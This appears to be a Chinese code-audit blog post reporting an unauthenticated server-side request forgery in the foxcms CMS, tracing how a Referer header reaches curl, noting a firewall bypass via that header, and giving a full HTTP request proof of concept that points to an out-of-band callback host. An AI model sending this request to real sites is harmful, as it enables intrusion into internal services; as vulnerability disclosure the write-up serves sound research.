#  代码审计-foxcms前台ssrf漏洞  
原创 xianke
                    xianke  XK Team   2026-03-02 02:26  
  
看到有个师傅审了这套代码，看了看都是后台的，想看看有没有前台的洞，最后还是水了一个，实际没啥用发出来给大佬们过过眼  
  
影响文件：  
  
app/plus/controller/Access.php  
  
漏洞分析：  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/nQxoGabMQtvib0SV8wiaQyShIV64mZvdbvt4vOmqmOaVo6BW2aCCBcjC7h9xOicq3aYlFpClBHlsofknZy256vicZVLuAVovNQM6y5nkzfazqb8/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
先看第一个箭头处代表我们可控参数 fp ，有两种传参一种通过get另一种通过函数getFromPage()，跟进函数  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/nQxoGabMQtv9Aap9fxzJnbc2lpVibxdctvmkib06humZGEJIzMLaibKSicwk6fbhWsqttZQrcDxqw3F8tTC9DUNXzNzyjmR0DbolcuaZjibrLIO0/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
是通过Referer头进行获取，那么可以确定我们有两种方式传参：**get**  
和**Referer头**  
  
接着看第二个箭头内容是把最后传参的值给到getPageTitle函数，继续跟进  
  
可以看到又传到了get_url_content函数，继续跟进  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/nQxoGabMQtuVZHZut8VfzydTDTYEibpJc123dCcnS1Vnev7SzElpKEzk1DrOKMBeajsXBKJwsiaOvI4vsdwaW9VZ4XP2KgnYWKjoibw1u0TXwM/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
最后进入get_url_content处理，发现直接拼接到了curl_setopt()，由于$url由上述fp或Referer头可控所以造成了ssrf漏洞  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/nQxoGabMQttxkBC1Oia0ou5dYibMKJokH7ltbkjH0UmfjiaiaEjia0N2GRfPW64TDFf9Ms6Uib6k9HZBydhxjACVkG5Y76UX2cAMaibnVGThlU55J0/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
最后实践发现GET传入会触发源码防火墙规则，而由Referer头传入则不会触发  
  
POC：  
  
GET /index.php/plus/Access/stat HTTP/1.1  
  
Host: 10.211.55.16  
  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0  
  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/  
;q=0.8  
  
Accept-Language: zh-CN  
  
Accept-Encoding: gzip, deflate, br  
  
Referer: http://dm8bfszp.eyes.sh/11  
  
Connection: keep-alive  
  
Cookie: PHPSESSID=440f0bbe3c95a745334c34b5b6584f98; c91fa4f94db8bd94a2d06e5b0bb147e4_ssl=5507a717-2b93-4a81-a24a-e629c42952e2.oLxl7_MIoC6xVI5W-qJldHeMLFY; access_10_211_55_2=1768064957  
  
Upgrade-Insecure-Requests: 1  
  
Priority: u=0, i  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/nQxoGabMQtvA1hUf9c2kvyrv90icGWhxILCU7jrpGar7mqWOoaSwLry3icsgUCXVnekC3XwVTlrINicicfLo0iaLLE02F4ACBtUoCdcrGGiapSlVE/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/nQxoGabMQts878FOJzBbMAMPa9o6aoVwBJT7ZTg7V93BpuQmFf6DsiaNzq9bWdUTog2Yv05MUichNsomclAoQxBPO6FvNbwibxGlnjjweEIrY4/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
  
